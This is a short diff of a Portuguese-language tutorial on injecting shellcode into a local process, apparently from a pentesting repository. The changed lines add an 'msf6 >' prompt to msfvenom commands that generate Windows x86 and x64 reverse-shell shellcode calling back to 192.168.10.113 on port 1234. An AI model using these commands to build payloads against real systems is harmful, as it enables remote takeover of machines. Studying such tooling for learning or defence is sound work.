@@ -22,7 +22,7 @@ módulo/processo local do próprio binário compilado com os bytes de shellcode 
 
 ```ruby
 msfconsole
-msfvenom -p windows/shell_reverse_tcp 
+msf6 > msfvenom -p windows/shell_reverse_tcp 
 LHOST=192.168.10.113 LPORT=1234 -f c -b \x00\x0a\x0d
 ```
 - Ou Gerar os bytes do shellcode para Windows x64, apontando para o IP e Porta do computador que vai ganhar o acesso.
@@ -30,7 +30,7 @@ LHOST=192.168.10.113 LPORT=1234 -f c -b \x00\x0a\x0d
 
 ```ruby
 msfconsole
-msfvenom -p windows/x64/shell_reverse_tcp
+msf6 > msfvenom -p windows/x64/shell_reverse_tcp
 LHOST=192.168.10.113 LPORT=1234 -f c -b \x00\x0a\x0d
 ```
 
